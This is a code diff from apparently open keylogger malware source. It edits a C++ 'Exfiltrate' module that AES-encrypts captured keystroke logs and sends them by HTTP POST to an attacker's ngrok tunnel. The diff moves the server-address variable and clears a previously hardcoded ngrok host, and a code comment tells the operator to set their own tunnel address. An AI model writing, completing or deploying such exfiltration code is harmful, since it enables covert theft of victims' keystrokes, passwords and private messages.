@@ -3,6 +3,7 @@
 
 #pragma comment(lib, "wininet.lib")
 
+#include "Auxiliary.h"
 #include <fstream>
 #include <vector>
 #include <string>
@@ -11,7 +12,6 @@
 #include <iostream>
 #include "IO.h"
 #include "Timer.h"
-#include "Auxiliary.h"
 
 /*
 
@@ -26,6 +26,11 @@ namespace Exfiltrate
 
 	bool exfilLogs(std::string keyLogToExfil);
 	bool sendHttpPOST(std::string &httpServerP, std::string &postBodyP);
+
+	// The variable httpServerAddress must be set to your ngrok tunnel address in order to properly recieve logs over the net
+	// Be sure to NOT put in the http:// portion into the variable, just the xyz.ngrok.io
+
+	std::string httpServerAddress = "";
 
 	bool exfilLogs(std::string keyLogToExfil)
 	{
@@ -51,11 +56,6 @@ namespace Exfiltrate
 		
 		sendData += Transformer::aesEncrypt(formattedData.str());
 		sendData += Transformer::getIV();
-
-		// The variable httpServerAddress must be set to your ngrok tunnel address in order to properly recieve logs over the net
-		// Be sure to NOT put in the http:// portion into the variable, just the xyz.ngrok.io
-
-		std::string httpServerAddress = "e88c-73-32-226-14.ngrok.io";
 
 		if (sendHttpPOST(httpServerAddress, sendData))
 		{
